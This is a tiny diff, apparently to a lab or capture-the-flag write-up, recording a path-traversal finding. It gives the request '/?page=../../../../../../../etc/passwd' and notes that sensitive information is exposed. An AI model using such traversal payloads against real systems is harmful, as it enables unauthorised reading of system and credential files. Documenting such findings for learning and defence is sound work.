@@ -1,1 +1,4 @@
-go to this URL: "/?page=../../../../../../../etc/passwd"
+On: ```/?page=../../../../../../../etc/passwd```
+
+### Flaw
+Sensitive information is public.
